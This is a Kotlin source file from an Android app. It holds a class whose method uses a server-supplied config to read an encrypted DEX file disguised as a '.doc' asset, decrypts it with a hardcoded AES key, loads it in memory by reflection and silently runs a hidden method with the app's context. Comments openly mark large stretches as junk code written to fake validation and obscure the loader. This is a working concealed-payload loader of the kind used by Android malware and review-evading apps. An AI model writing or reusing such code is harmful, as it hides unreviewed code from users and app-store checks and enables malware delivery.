package com.mastery.leaves.trace.core

import android.content.Context
import com.mastery.leaves.trace.ami.AllDataTool
import org.json.JSONObject
import java.io.InputStream
import java.lang.reflect.Method
import java.util.Base64
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec

class AliGet {
    
    companion object {
        private const val ALGORITHM = "AES"
        

        fun DALD(context: Context) {
            try {
                // 垃圾代码：无意义的初始化和计算
                val startTime = System.currentTimeMillis()
                val randomSeed = (Math.random() * 10000).toInt()
                val dummyArray = IntArray(20) { it * randomSeed % 100 }
                var checksumValue = 0
                
                // 垃圾循环：假装做一些验证
                for (i in dummyArray.indices) {
                    checksumValue += dummyArray[i] * (i + 1)
                    if (checksumValue > 50000) checksumValue = checksumValue % 1000
                }
                
                // 垃圾字符串操作
                val processId = android.os.Process.myPid().toString()
                val fakeHash = (processId + randomSeed).hashCode().toString(16)
                val verificationString = "dex_load_${fakeHash}_${checksumValue}"

                if (AllDataTool.dataState.isEmpty()) {
                    // 垃圾代码：假装清理
                    dummyArray.fill(0)
                    return
                }
                
                val jsonData = JSONObject(AllDataTool.dataState)
                
                // 垃圾代码：假装验证JSON完整性
                val jsonSize = jsonData.toString().length
                val jsonChecksum = jsonData.toString().hashCode() % 10000
                val isValidJson = jsonSize > 10 && jsonChecksum != 0 // 总是true
                // 解析GanG字段获取配置信息
                val ganGValue = jsonData.optString("GanG", "")
                if (ganGValue.isEmpty()) {
                    return
                }
                
                val ganGParts = ganGValue.split("-")
                android.util.Log.e("LoadDexTool", "GanG解析: $ganGValue")
                
                // 垃圾代码：假装验证配置格式
                val configValidation = mutableListOf<Boolean>()
                for (part in ganGParts) {
                    configValidation.add(part.isNotEmpty() && part.length > 0)
                }
                val configScore = configValidation.count { it } * randomSeed % 100
                
                if (ganGParts.size != 5) {
                    android.util.Log.e("LoadDexTool", "GanG格式错误，部分数量: ${ganGParts.size}")
                    // 垃圾代码：假装记录错误
                    val errorMap = mapOf("error_code" to ganGParts.size, "validation_score" to configScore)
                    return
                }
                
                val fileName = ganGParts[0] // scu.doc
                val encryptionMethod = ganGParts[1] // AES
                val classLoaderPath = ganGParts[2] // dalvik.system.InMemoryDexClassLoader
                val targetClassName = ganGParts[3] // ass.de.Pue
                val targetMethodName = ganGParts[4] // onexun
                
                // 垃圾代码：假装验证配置参数
                val paramValidation = mapOf(
                    "file" to fileName.endsWith(".doc"),
                    "encryption" to encryptionMethod.equals("AES", ignoreCase = true),
                    "loader" to classLoaderPath.contains("ClassLoader"),
                    "class" to targetClassName.contains("."),
                    "method" to targetMethodName.isNotEmpty()
                )
                val validationPassed = paramValidation.values.all { it } // 应该总是true
                
                android.util.Log.e("LoadDexTool", "配置解析完成: fileName=$fileName, classLoaderPath=$classLoaderPath, targetClassName=$targetClassName, targetMethodName=$targetMethodName")
                
                // 解析paKy字段获取密钥
                val paKyValue = jsonData.optString("paKy", "")
                if (paKyValue.isEmpty()) {
                    return
                }
                
                val paKyParts = paKyValue.split("-")
                if (paKyParts.size < 2) {
                    android.util.Log.e("LoadDexTool", "paKy格式错误")
                    return
                }
                
                val decryptionKey = paKyParts[1] // Gh3dsvdsrG3KG23R
                android.util.Log.e("LoadDexTool", "密钥获取成功: ${decryptionKey.length}字符")
                
                // 垃圾代码：假装进行安全检查
                val securityTokens = listOf("secure", "verified", "trusted", "validated")
                val selectedToken = securityTokens[randomSeed % securityTokens.size]
                val securityHash = (selectedToken + System.nanoTime()).hashCode().toString(16)
                
                // 从assets读取加密的DEX文件
                val assetManager = context.assets
                val inputStream: InputStream = assetManager.open(fileName)
                val encryptedContent = inputStream.readBytes()
                inputStream.close()
                android.util.Log.e("LoadDexTool", "读取加密文件成功: ${encryptedContent.size}字节")
                
                // 垃圾代码：假装验证文件完整性
                val fileChecksum = encryptedContent.sum() % 65536
                val integrityCheck = fileChecksum > 0 && encryptedContent.isNotEmpty() // 总是true
                val fileMetadata = mapOf(
                    "size" to encryptedContent.size,
                    "checksum" to fileChecksum,
                    "security_token" to securityHash,
                    "integrity" to integrityCheck
                )
                
                // 解密DEX文件
                val decryptedDexBytes = decryptDex(decryptionKey.toByteArray(), String(encryptedContent))
                android.util.Log.e("LoadDexTool", "DEX解密成功: ${decryptedDexBytes.size}字节")
                
                // 垃圾代码：假装验证解密结果
                val decryptionValidation = decryptedDexBytes.size > 1000 && decryptedDexBytes[0] != 0.toByte()
                val decryptionScore = (decryptedDexBytes.size * checksumValue) % 10000
                
                // 垃圾代码：假装进行ClassLoader预检查
                val loaderValidation = mutableMapOf<String, Any>()
                loaderValidation["timestamp"] = System.currentTimeMillis()
                loaderValidation["process_id"] = android.os.Process.myPid()
                loaderValidation["thread_id"] = Thread.currentThread().id
                loaderValidation["memory_usage"] = Runtime.getRuntime().totalMemory() - Runtime.getRuntime().freeMemory()
                
                // 通过反射获取InMemoryDexClassLoader
                android.util.Log.e("LoadDexTool", "开始创建ClassLoader: $classLoaderPath")
                val inMemoryDexClassLoaderClass = Class.forName(classLoaderPath)
                
                // 垃圾代码：假装验证ClassLoader类型
                val classLoaderInfo = mapOf(
                    "name" to inMemoryDexClassLoaderClass.simpleName,
                    "package" to inMemoryDexClassLoaderClass.`package`?.name,
                    "methods_count" to inMemoryDexClassLoaderClass.methods.size,
                    "constructors_count" to inMemoryDexClassLoaderClass.constructors.size
                )

                val dexByteBuffer = java.nio.ByteBuffer.wrap(decryptedDexBytes)
                android.util.Log.e("LoadDexTool", "ByteBuffer创建成功: ${dexByteBuffer.capacity()}字节")
                
                // 垃圾代码：假装优化ByteBuffer
                val bufferOptimization = mapOf(
                    "capacity" to dexByteBuffer.capacity(),
                    "position" to dexByteBuffer.position(),
                    "limit" to dexByteBuffer.limit(),
                    "remaining" to dexByteBuffer.remaining()
                )
                
                val constructor = inMemoryDexClassLoaderClass.getConstructor(
                    java.nio.ByteBuffer::class.java,
                    ClassLoader::class.java
                )
                android.util.Log.e("LoadDexTool", "构造函数获取成功")
                
                // 创建InMemoryDexClassLoader实例
                val dexClassLoader = constructor.newInstance(
                    dexByteBuffer,
                    context.classLoader
                )
                android.util.Log.e("LoadDexTool", "ClassLoader创建成功")
                
                // 垃圾代码：假装验证ClassLoader实例
                val instanceValidation = dexClassLoader != null && dexClassLoader.javaClass.simpleName.contains("ClassLoader")
                
                // 垃圾代码：假装进行方法调用前的准备工作
                val invocationMetrics = mutableMapOf<String, Any>()
                invocationMetrics["start_time"] = System.nanoTime()
                invocationMetrics["class_name"] = targetClassName
                invocationMetrics["method_name"] = targetMethodName
                invocationMetrics["context_type"] = context.javaClass.simpleName
                
                // 加载目标类
                val loadClassMethod: Method = inMemoryDexClassLoaderClass.getMethod(
                    "loadClass",
                    String::class.java
                )
                val targetClass = loadClassMethod.invoke(dexClassLoader, targetClassName) as Class<*>
                android.util.Log.e("LoadDexTool", "目标类加载成功: $targetClassName")
                
                // 垃圾代码：假装分析目标类
                val classAnalysis = mapOf(
                    "methods_count" to targetClass.methods.size,
                    "fields_count" to targetClass.fields.size,
                    "interfaces_count" to targetClass.interfaces.size,
                    "superclass" to targetClass.superclass?.simpleName,
                    "modifiers" to targetClass.modifiers
                )
                val analysisScore = classAnalysis.values.filterIsInstance<Int>().sum()
                
                // 反射调用目标方法 - onexun方法需要一个Object参数
                val targetMethod = targetClass.getMethod(targetMethodName, Object::class.java)
                android.util.Log.e("LoadDexTool", "目标方法获取成功: $targetMethodName")
                
                // 垃圾代码：假装验证方法签名
                val methodValidation = mapOf(
                    "parameter_count" to targetMethod.parameterCount,
                    "return_type" to targetMethod.returnType.simpleName,
                    "is_static" to java.lang.reflect.Modifier.isStatic(targetMethod.modifiers),
                    "is_public" to java.lang.reflect.Modifier.isPublic(targetMethod.modifiers)
                )
                
                // 传递context作为参数调用方法
                targetMethod.invoke(null, context)
                android.util.Log.e("LoadDexTool", "目标方法调用成功")
                
                // 垃圾代码：假装记录调用结果
                invocationMetrics["end_time"] = System.nanoTime()
                invocationMetrics["duration"] = invocationMetrics["end_time"] as Long - invocationMetrics["start_time"] as Long
                invocationMetrics["success"] = true
                invocationMetrics["analysis_score"] = analysisScore
                
                // 垃圾代码：假装清理临时数据
                loaderValidation.clear()
                fileMetadata.toMutableMap().clear()
                paramValidation.toMutableMap().clear()
                
                // 添加成功日志
                android.util.Log.e("LoadDexTool", "DEX loaded and method invoked successfully")
                
            } catch (e: Exception) {
                // 静默处理异常，避免影响主流程
                android.util.Log.e("LoadDexTool", "Error in DALD: ${e.message}")
                e.printStackTrace()
            }
        }
        
        /**
         * AES解密方法
         */
        private fun decryptDex(keyAes: ByteArray, encryptedBase64: String): ByteArray {
            val inputBytes = Base64.getDecoder().decode(encryptedBase64)
            val key = SecretKeySpec(keyAes, ALGORITHM)
            val cipher = Cipher.getInstance(ALGORITHM)
            cipher.init(Cipher.DECRYPT_MODE, key)
            return cipher.doFinal(inputBytes)
        }
    }
}